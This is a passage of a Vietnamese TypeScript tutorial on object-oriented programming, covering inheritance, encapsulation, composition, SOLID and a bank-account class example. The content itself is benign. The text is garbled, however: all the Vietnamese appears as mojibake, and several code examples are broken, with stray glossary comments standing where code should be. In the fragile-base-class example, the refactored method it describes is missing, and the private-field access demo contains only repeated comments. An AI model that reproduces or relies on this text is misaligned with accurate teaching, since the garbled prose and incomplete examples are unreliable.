‚îÇ  ‚îÇ   constructor(name) { ... }        ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   login() { ... }                  ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ }                                   ‚îÇ                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ
‚îÇ               ‚Üì                                          ‚îÇ
‚îÇ  2. INSTANTIATION (Create object)                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ
‚îÇ  ‚îÇ const user = new User('John')       ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ user.login() // Ch√∫ gi·∫£i: Call method        ‚îÇ                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ
‚îÇ               ‚Üì                                          ‚îÇ
‚îÇ  3. INHERITANCE (Reuse code)                            ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ
‚îÇ  ‚îÇ class Admin extends User {          ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   deleteUser() { ... }              ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ }                                   ‚îÇ                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ
‚îÇ               ‚Üì                                          ‚îÇ
‚îÇ  4. POLYMORPHISM (Override behavior)                    ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ
‚îÇ  ‚îÇ class Admin extends User {          ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   login() { // Ch√∫ gi·∫£i: Override             ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ     super.login()                   ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ     this.logAudit()                 ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   }                                  ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ }                                   ‚îÇ                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ
‚îÇ               ‚Üì                                          ‚îÇ
‚îÇ  5. COMPOSITION (Combine objects)                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ
‚îÇ  ‚îÇ class User {                        ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   constructor(logger) {             ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ     this.logger = logger // Ch√∫ gi·∫£i: Inject ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   }                                  ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ }                                   ‚îÇ                ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**∆Øu ƒëi·ªÉm:**

1. **‚úÖ Code Reusability (T√°i s·ª≠ d·ª•ng Code)**

   - **Gi·∫£i th√≠ch**: Inheritance cho ph√©p class con k·∫ø th·ª´a t·∫•t c·∫£ properties/methods t·ª´ class cha
   - **L·ª£i √≠ch**: Kh√¥ng ph·∫£i vi·∫øt l·∫°i code ‚Üí gi·∫£m duplication, d·ªÖ maintain
   - **V√≠ d·ª•**:
     - `Admin extends User` ‚Üí Admin c√≥ s·∫µn `login()`, `logout()` t·ª´ User
     - Ch·ªâ c·∫ßn vi·∫øt th√™m methods ri√™ng nh∆∞ `deleteUser()`, `manageRoles()`
   - **Th·ª±c t·∫ø**:
     - Base class `Animal` c√≥ `eat()`, `sleep()`
     - `Dog`, `Cat`, `Bird` ƒë·ªÅu k·∫ø th·ª´a ‚Üí kh√¥ng vi·∫øt l·∫°i 3 l·∫ßn

2. **‚úÖ Maintainability (D·ªÖ B·∫£o tr√¨)**

   - **Gi·∫£i th√≠ch**: Encapsulation (ƒë√≥ng g√≥i) ·∫©n implementation details, ch·ªâ expose public API
   - **L·ª£i √≠ch**:
     - Thay ƒë·ªïi internal logic kh√¥ng ·∫£nh h∆∞·ªüng code b√™n ngo√†i
     - T√°ch bi·ªát concerns (data vs behavior)
     - D·ªÖ refactor
   - **V√≠ d·ª•**:
     - `#balance` trong BankAccount l√† private ‚Üí thay ƒë·ªïi c√°ch t√≠nh balance kh√¥ng ·∫£nh h∆∞·ªüng caller
     - External code ch·ªâ g·ªçi `getBalance()` (stable API)
   - **Th·ª±c t·∫ø**:
     - S·ª≠a validation logic trong `UserValidator` ‚Üí kh√¥ng ·∫£nh h∆∞·ªüng `UserService`
     - Thay database trong `UserRepository` ‚Üí kh√¥ng ·∫£nh h∆∞·ªüng business logic

3. **‚úÖ Scalability (Kh·∫£ nƒÉng M·ªü r·ªông)**

   - **Gi·∫£i th√≠ch**: D·ªÖ d√†ng th√™m t√≠nh nƒÉng m·ªõi qua subclasses ho·∫∑c composition
   - **L·ª£i √≠ch**:
     - Extend functionality m√† kh√¥ng s·ª≠a code c≈© (Open/Closed Principle)
     - Th√™m classes m·ªõi ƒë·ªôc l·∫≠p
   - **V√≠ d·ª•**:
     - C√≥ `PaymentMethod` abstract ‚Üí th√™m `MomoPayment`, `ZaloPayPayment` d·ªÖ d√†ng
     - Kh√¥ng c·∫ßn s·ª≠a code x·ª≠ l√Ω payment hi·ªán t·∫°i
   - **Th·ª±c t·∫ø**:
     - E-commerce c√≥ `StandardShipping` ‚Üí th√™m `ExpressShipping`, `SameDayShipping`
     - Trading system c√≥ `MarketOrder` ‚Üí th√™m `LimitOrder`, `StopLossOrder`

4. **‚úÖ Type Safety (An to√†n Ki·ªÉu)**

   - **Gi·∫£i th√≠ch**: TypeScript interfaces/abstract classes enforce contracts, catch errors at compile-time
   - **L·ª£i √≠ch**:
     - IDE autocomplete ƒë·∫ßy ƒë·ªß
     - Catch errors tr∆∞·ªõc khi run code
     - Documentation t·ª± ƒë·ªông qua types
   - **V√≠ d·ª•**:

     ```typescript
     interface ILogger {
       log(message: string): void; // Ch√∫ gi·∫£i: Contract
     }

     class Service {
       constructor(private logger: ILogger) {} // Ch√∫ gi·∫£i: Type-safe
     }

     new Service(123); // ‚ùå Error: 123 kh√¥ng ph·∫£i ILogger
     ```

   - **Th·ª±c t·∫ø**:
     - `UserService` require `ILogger` ‚Üí kh√¥ng th·ªÉ pass `string` hay `number`
     - Refactor method signature ‚Üí TypeScript b√°o l·ªói t·∫•t c·∫£ n∆°i g·ªçi

5. **‚úÖ Testability (D·ªÖ Ki·ªÉm th·ª≠)**

   - **Gi·∫£i th√≠ch**: Dependency Injection v·ªõi composition cho ph√©p inject mocks khi test
   - **L·ª£i √≠ch**:
     - Test isolated (kh√¥ng ph·ª• thu·ªôc external services)
     - Fast (kh√¥ng call API/database th·∫≠t)
     - Predictable (mock return c·ªë ƒë·ªãnh)
   - **V√≠ d·ª•**:

     ```typescript
 // Ch√∫ gi·∫£i: Production
     const service = new UserService(new RealLogger(), new RealEmailService());

 // Ch√∫ gi·∫£i: Testing
     const service = new UserService(new MockLogger(), new MockEmailService());
     ```

   - **Th·ª±c t·∫ø**:
     - Test `TradingService` v·ªõi mock `OrderExecutor` ‚Üí kh√¥ng g·ª≠i l·ªánh th·∫≠t l√™n s√†n
     - Test `PaymentService` v·ªõi mock `PaymentGateway` ‚Üí kh√¥ng charge ti·ªÅn th·∫≠t

**Nh∆∞·ª£c ƒëi·ªÉm:**

1. **‚ùå Over-Engineering (Thi·∫øt k·∫ø Qu√° ph·ª©c t·∫°p)**

   - **Gi·∫£i th√≠ch**: Inheritance hierarchy qu√° s√¢u (nhi·ªÅu t·∫ßng k·∫ø th·ª´a) ‚Üí kh√≥ hi·ªÉu, kh√≥ maintain
   - **V·∫•n ƒë·ªÅ**:
     - Ph·∫£i ƒë·ªçc nhi·ªÅu classes ƒë·ªÉ hi·ªÉu logic
     - Kh√≥ trace method ƒë∆∞·ª£c g·ªçi t·ª´ ƒë√¢u
     - Th√™m t√≠nh nƒÉng m·ªõi ph·∫£i hi·ªÉu c·∫£ hierarchy
   - **V√≠ d·ª• BAD**:
     ```typescript
     class Animal {}
     class Mammal extends Animal {}
     class Carnivore extends Mammal {}
     class Feline extends Carnivore {}
     class Cat extends Feline {}
     class PersianCat extends Cat {} // QU√Å S√ÇU! 6 t·∫ßng
     ```
   - **V·∫•n ƒë·ªÅ th·ª±c t·∫ø**:
     - S·ª≠a `Animal` ‚Üí ph·∫£i test l·∫°i 5 classes con
     - Th√™m method trong `Mammal` ‚Üí c√≥ th·ªÉ break `PersianCat`
   - **Gi·∫£i ph√°p**: Gi·ªõi h·∫°n 2-3 t·∫ßng, prefer composition

2. **‚ùå Tight Coupling (Li√™n k·∫øt Ch·∫∑t ch·∫Ω)**

   - **Gi·∫£i th√≠ch**: Subclass ph·ª• thu·ªôc ch·∫∑t ch·∫Ω v√†o parent ‚Üí thay ƒë·ªïi parent c√≥ th·ªÉ break child
   - **V·∫•n ƒë·ªÅ**:
     - Cannot remove/change parent methods (children ƒëang d√πng)
     - Subclass bi·∫øt qu√° nhi·ªÅu v·ªÅ parent internals
     - Kh√≥ refactor
   - **V√≠ d·ª• BAD**:

     ```typescript
     class UserService extends Logger {
       registerUser() {
         this.log('Registering...'); // Ph·ª• thu·ªôc v√†o Logger.log()
       }
     }

     // N·∫øu Logger.log() ƒë·ªïi signature ‚Üí UserService break!
     ```

   - **V·∫•n ƒë·ªÅ th·ª±c t·∫ø**:
     - `Admin extends User` ‚Üí n·∫øu User th√™m required param trong constructor ‚Üí t·∫•t c·∫£ subclasses ph·∫£i update
     - `PremiumAccount extends BankAccount` ‚Üí n·∫øu BankAccount ƒë·ªïi c√°ch t√≠nh balance ‚Üí PremiumAccount c√≥ th·ªÉ sai
   - **Gi·∫£i ph√°p**: D√πng composition thay v√¨ inheritance

3. **‚ùå Fragile Base Class Problem (V·∫•n ƒë·ªÅ Class Cha D·ªÖ v·ª°)**

   - **Gi·∫£i th√≠ch**: Thay ƒë·ªïi nh·ªè trong parent class c√≥ th·ªÉ break t·∫•t c·∫£ children classes
   - **V·∫•n ƒë·ªÅ**:
     - S·ª≠a bug trong parent ‚Üí introduce bugs trong children
     - Kh√¥ng d√°m refactor parent v√¨ s·ª£ break children
     - Side effects kh√¥ng mong mu·ªën
   - **V√≠ d·ª• BAD**:

     ```typescript
     class Counter {
       count = 0;
       increment() {
         this.count++;
       }
       incrementTwice() {
         this.increment();
         this.increment();
       }
     }

     class SpecialCounter extends Counter {
       increment() {
         super.increment();
         console.log('Incremented!'); // Ch√∫ gi·∫£i: Log m·ªói l·∫ßn increment
       }
     }

     const counter = new SpecialCounter();
     counter.incrementTwice(); // Ch√∫ gi·∫£i: Logs 2 l·∫ßn (expected)

     // ‚ùå N·∫øu parent refactor incrementTwice():
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
     // ‚Üí KH√îNG g·ªçi increment() n·ªØa ‚Üí SpecialCounter KH√îNG log!
     ```

   - **V·∫•n ƒë·ªÅ th·ª±c t·∫ø**:
     - Parent th√™m validation trong method ‚Üí children override m√† qu√™n g·ªçi `super()` ‚Üí bypass validation
     - Parent ƒë·ªïi order c·ªßa operations ‚Üí children expect old order ‚Üí behavior sai
   - **Gi·∫£i ph√°p**: Document parent behavior, use protected methods carefully

4. **‚ùå Memory Overhead (T·ªën B·ªô nh·ªõ) - Tr∆∞·ªõc ES6**

   - **Gi·∫£i th√≠ch**: Tr∆∞·ªõc ES6 (kh√¥ng c√≥ class syntax), m·ªói instance duplicate methods ‚Üí t·ªën memory
   - **V·∫•n ƒë·ªÅ**:
     - T·∫°o 1000 objects ‚Üí 1000 copies c·ªßa c√πng 1 method
     - Memory usage tƒÉng tuy·∫øn t√≠nh v·ªõi s·ªë instances
   - **V√≠ d·ª• BAD (Pre-ES6)**:

     ```typescript
     function User(name) {
       this.name = name;
       this.login = function () {
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
         console.log('Logging in...');
       };
     }

     const user1 = new User('A');
     const user2 = new User('B');
     // user1.login !== user2.login (2 copies kh√°c nhau!)
     ```

   - **Gi·∫£i th√≠ch**:
     - M·ªói instance c√≥ 1 copy ri√™ng c·ªßa `login()` method
     - 1000 users ‚Üí 1000 copies ‚Üí waste memory
   - **Gi·∫£i ph√°p (ES6+)**:

     ```typescript
     class User {
       constructor(name) {
         this.name = name;
       }
       login() {
         // ‚úÖ Method tr√™n prototype
         console.log('Logging in...');
       }
     }

     // T·∫•t c·∫£ instances share 1 login() tr√™n prototype
     // user1.login === user2.login (c√πng 1 method!)
     ```

   - **L∆∞u √Ω**: ES6 classes t·ª± ƒë·ªông ƒë·∫∑t methods tr√™n prototype ‚Üí kh√¥ng c√≤n v·∫•n ƒë·ªÅ n√†y

5. **‚ùå Harder Debugging (Kh√≥ Debug h∆°n)**

   - **Gi·∫£i th√≠ch**: Method lookup qua prototype chain ‚Üí kh√≥ trace method ƒë∆∞·ª£c g·ªçi t·ª´ ƒë√¢u
   - **V·∫•n ƒë·ªÅ**:
     - Stack trace d√†i, nhi·ªÅu t·∫ßng
     - Kh√¥ng bi·∫øt method override ·ªü ƒë√¢u
     - Breakpoint ph·∫£i set nhi·ªÅu n∆°i
   - **V√≠ d·ª•**:

     ```typescript
     class A {
       method() {
         console.log('A');
       }
     }

     class B extends A {
       method() {
         super.method(); // Ch√∫ gi·∫£i: G·ªçi A.method()
         console.log('B');
       }
     }

     class C extends B {
       method() {
         super.method(); // Ch√∫ gi·∫£i: G·ªçi B.method() ‚Üí g·ªçi A.method()
         console.log('C');
       }
     }

     new C().method();
 // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.
     // Ph·∫£i trace qua 3 t·∫ßng ƒë·ªÉ hi·ªÉu flow
     ```

   - **V·∫•n ƒë·ªÅ th·ª±c t·∫ø**:
     - Bug trong `PremiumAccount.withdraw()` ‚Üí ph·∫£i check c·∫£ `BankAccount.withdraw()`
     - Method ƒë∆∞·ª£c override ·ªü nhi·ªÅu levels ‚Üí kh√¥ng bi·∫øt ƒëang ch·∫°y implementation n√†o
     - Debugging tools hi·ªÉn th·ªã prototype chain ph·ª©c t·∫°p
   - **Gi·∫£i ph√°p**:
     - Gi·ªõi h·∫°n inheritance depth (2-3 t·∫ßng max)
     - Document override behavior r√µ r√†ng
     - Use composition khi c√≥ th·ªÉ

**Ch√∫ th√≠ch:**

**üîí Private Fields `#` (Th·ª±c s·ª± Private):**

- Syntax: `#fieldName` (b·∫Øt ƒë·∫ßu b·∫±ng d·∫•u `#`)
- **Kh√¥ng th·ªÉ truy c·∫≠p** t·ª´ b√™n ngo√†i class, k·ªÉ c·∫£ subclass
- Kh√°c `_prefix` (ch·ªâ l√† convention, v·∫´n access ƒë∆∞·ª£c)
- V√≠ d·ª•: `account.#balance` ‚Üí ‚ùå Error

**üîó `extends` (K·∫ø th·ª´a):**

- T·∫°o class con k·∫ø th·ª´a t·ª´ class cha
- T·∫°o **prototype chain**: Child.prototype ‚Üí Parent.prototype
- Child c√≥ t·∫•t c·∫£ properties/methods c·ªßa Parent
- V√≠ d·ª•: `class Admin extends User { ... }`

**‚¨ÜÔ∏è `super` (G·ªçi Parent):**

- Trong constructor: `super()` g·ªçi parent constructor (b·∫Øt bu·ªôc g·ªçi tr∆∞·ªõc `this`)
- Trong method: `super.methodName()` g·ªçi parent method
- V√≠ d·ª•:
  ```typescript
  constructor(name) {
    super(name); // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
    this.role = 'admin';
  }
  ```

**üß© Composition > Inheritance (∆Øu ti√™n K·∫øt h·ª£p h∆°n K·∫ø th·ª´a):**

- **Inheritance**: "Is-a" relationship (Admin **l√†** User)
- **Composition**: "Has-a" relationship (UserService **c√≥** Logger)
- Composition linh ho·∫°t h∆°n, √≠t tight coupling h∆°n
- D·ªÖ test h∆°n (mock dependencies)
- V√≠ d·ª•:

  ```typescript
 // Ch√∫ gi·∫£i: ‚ùå Inheritance: ph·ª• thu·ªôc parent
  class UserService extends Logger {}

 // Ch√∫ gi·∫£i: ‚úÖ Composition: inject dependency
  class UserService {
    constructor(private logger: Logger) {}
  }
  ```

**üìê SOLID Principles (Gi·∫£i th√≠ch ƒë∆°n gi·∫£n):**

1. **Single Responsibility (Tr√°ch nhi·ªám ƒê∆°n l·∫ª)**

   - 1 class ch·ªâ l√†m 1 vi·ªác duy nh·∫•t
   - D·ªÖ hi·ªÉu, d·ªÖ maintain, d·ªÖ test
   - V√≠ d·ª•: `UserValidator` ch·ªâ validate, `UserRepository` ch·ªâ save/load

2. **Open/Closed (M·ªü-ƒê√≥ng)**

   - M·ªü cho **extension** (th√™m t√≠nh nƒÉng m·ªõi)
   - ƒê√≥ng cho **modification** (kh√¥ng s·ª≠a code c≈©)
   - D√πng abstract class/interface ƒë·ªÉ extend
   - V√≠ d·ª•: Th√™m `BuyOneGetOne` discount m√† kh√¥ng s·ª≠a class `Discount`

3. **Liskov Substitution (Thay th·∫ø Liskov)**

   - Subclass ph·∫£i thay th·∫ø ƒë∆∞·ª£c parent m√† kh√¥ng break code
   - Child ph·∫£i tu√¢n th·ªß "contract" c·ªßa parent
   - V√≠ d·ª•: `CreditCardPayment` v√† `BankTransferPayment` ƒë·ªÅu work v·ªõi `PaymentMethod`

4. **Interface Segregation (T√°ch Interface)**

   - Nhi·ªÅu interfaces nh·ªè > 1 interface l·ªõn
   - Class ch·ªâ implement methods c·∫ßn thi·∫øt
   - V√≠ d·ª•: `IReadable`, `IWritable`, `IDeletable` ri√™ng bi·ªát thay v√¨ 1 interface c√≥ t·∫•t c·∫£

5. **Dependency Inversion (ƒê·∫£o ng∆∞·ª£c Ph·ª• thu·ªôc)**
   - Ph·ª• thu·ªôc v√†o **abstractions** (interfaces/abstract classes)
   - Kh√¥ng ph·ª• thu·ªôc v√†o **concretions** (concrete classes)
   - D·ªÖ swap implementations, d·ªÖ test
   - V√≠ d·ª•: `OrderService` nh·∫≠n `ILogger` (interface) thay v√¨ `ConsoleLogger` (concrete)

**Code Example (TypeScript):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// 1. BASIC CLASS WITH ENCAPSULATION (ƒê√≥ng g√≥i)
 // Ch√∫ gi·∫£i: ============================================
// üè¶ V√≠ d·ª•: T√†i kho·∫£n ng√¢n h√†ng - ·∫©n s·ªë d∆∞ b√™n trong
class BankAccount {
  // üîí Private field: ch·ªâ class n√†y access ƒë∆∞·ª£c
  #balance: number = 0; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

  constructor(
    public readonly accountNumber: string, // S·ªë t√†i kho·∫£n (readonly: kh√¥ng s·ª≠a ƒë∆∞·ª£c)
    private owner: string // Ch·ªß t√†i kho·∫£n (private: ch·ªâ trong class)
  ) {
    // accountNumber l√† public ‚Üí c√≥ th·ªÉ ƒë·ªçc: account.accountNumber
    // owner l√† private ‚Üí KH√îNG th·ªÉ ƒë·ªçc t·ª´ b√™n ngo√†i: account.owner ‚ùå
  }

  // üí∞ Public method: g·ª≠i ti·ªÅn (deposit = n·∫°p ti·ªÅn)
  deposit(amount: number): void {
    if (amount <= 0) throw new Error('S·ªë ti·ªÅn ph·∫£i > 0');
    this.#balance += amount; // C·ªông v√†o s·ªë d∆∞
    console.log(`‚úÖ ƒê√£ n·∫°p ${amount}ƒë. S·ªë d∆∞: ${this.#balance}ƒë`);
  }

  // üí∏ Public method: r√∫t ti·ªÅn (withdraw = r√∫t)
  withdraw(amount: number): void {
    if (amount > this.#balance) {
      throw new Error('S·ªë d∆∞ kh√¥ng ƒë·ªß!');
    }
    this.#balance -= amount; // Ch√∫ gi·∫£i: Tr·ª´ s·ªë d∆∞
    console.log(`‚úÖ ƒê√£ r√∫t ${amount}ƒë. C√≤n l·∫°i: ${this.#balance}ƒë`);
  }

 // Ch√∫ gi·∫£i: üìä Public method: xem s·ªë d∆∞ (getBalance = l·∫•y s·ªë d∆∞)
  getBalance(): number {
    return this.#balance; // Ch·ªâ ƒë·ªçc, kh√¥ng s·ª≠a ƒë∆∞·ª£c t·ª´ b√™n ngo√†i
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng class
const account = new BankAccount('123456', 'Nguy·ªÖn VƒÉn A');
account.deposit(1000); // ‚úÖ N·∫°p 1000ƒë
console.log(account.getBalance()); // Ch√∫ gi·∫£i: 1000
account.withdraw(300); // ‚úÖ R√∫t 300ƒë

// ‚ùå KH√îNG th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp private field
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i. Tr∆∞·ªùng private b·∫Øt ƒë·∫ßu b·∫±ng `#` ch·ªâ c√≥ th·ªÉ truy c·∫≠p trong class, g√¢y l·ªói khi truy c·∫≠p ngo√†i.
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
console.log(account.accountNumber); // Ch√∫ gi·∫£i: ‚úÖ OK: '123456' (public readonly)

 // Ch√∫ gi·∫£i: ============================================
// 2. INHERITANCE (K·∫ø th·ª´a) & POLYMORPHISM (ƒêa h√¨nh)
 // Ch√∫ gi·∫£i: ============================================
// üíé T√†i kho·∫£n Premium: k·∫ø th·ª´a BankAccount + th√™m t√≠nh nƒÉng m·ªõi
class PremiumAccount extends BankAccount {
  private creditLimit: number; // H·∫°n m·ª©c t√≠n d·ª•ng (credit limit)

  constructor(accountNumber: string, owner: string, creditLimit: number) {
    // ‚¨ÜÔ∏è super() B·∫ÆT BU·ªòC g·ªçi TR∆Ø·ªöC khi d√πng 'this'
    super(accountNumber, owner); // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
    this.creditLimit = creditLimit;
  }

  // üîÑ Override (ghi ƒë√®) method withdraw c·ªßa parent (Polymorphism)
  withdraw(amount: number): void {
    // üí° PremiumAccount c√≥ th·ªÉ r√∫t qu√° s·ªë d∆∞ nh·ªù credit limit
    const available = this.getBalance() + this.creditLimit;

    if (amount > available) {
      throw new Error(`V∆∞·ª£t h·∫°n m·ª©c! Kh·∫£ d·ª•ng: ${available}ƒë`);
    }

    // R√∫t s·ªë d∆∞ tr∆∞·ªõc
    const balanceToWithdraw = Math.min(amount, this.getBalance());
    if (balanceToWithdraw > 0) {
      super.withdraw(balanceToWithdraw); // Ch√∫ gi·∫£i: G·ªçi method c·ªßa parent
    }

    // N·∫øu c√≤n thi·∫øu ‚Üí d√πng credit
    const creditUsed = amount - balanceToWithdraw;
    if (creditUsed > 0) {
      console.log(`üí≥ S·ª≠ d·ª•ng credit: ${creditUsed}ƒë`);
    }
  }

  // ‚ûï Method M·ªöI ch·ªâ c√≥ ·ªü PremiumAccount (kh√¥ng c√≥ ·ªü BankAccount)
  getCreditInfo() {
    return {
      balance: this.getBalance(), // S·ªë d∆∞ hi·ªán t·∫°i
      creditLimit: this.creditLimit, // H·∫°n m·ª©c t√≠n d·ª•ng
      available: this.getBalance() + this.creditLimit, // Ch√∫ gi·∫£i: T·ªïng kh·∫£ d·ª•ng
    };
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng inheritance
const premium = new PremiumAccount('789', 'Tr·∫ßn Th·ªã B', 5000);
premium.deposit(2000); // ‚úÖ C√≥ method t·ª´ parent (BankAccount)
premium.withdraw(3000); // ‚úÖ Override: r√∫t qu√° s·ªë d∆∞ nh·ªù credit
console.log(premium.getCreditInfo()); // Ch√∫ gi·∫£i: ‚úÖ Method m·ªõi c·ªßa PremiumAccount
 // Ch√∫ gi·∫£i: Output: { balance: 0, creditLimit: 5000, available: 5000 }

// üìù Gi·∫£i th√≠ch Polymorphism:
// - BankAccount.withdraw() ‚Üí ch·ªâ r√∫t trong s·ªë d∆∞
// - PremiumAccount.withdraw() ‚Üí r√∫t c·∫£ credit limit (behavior kh√°c)
// C√πng t√™n method nh∆∞ng h√†nh vi kh√°c nhau!

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. ABSTRACT CLASS (L·ªõp Tr·ª´u t∆∞·ª£ng) & INTERFACE
 // Ch√∫ gi·∫£i: ============================================
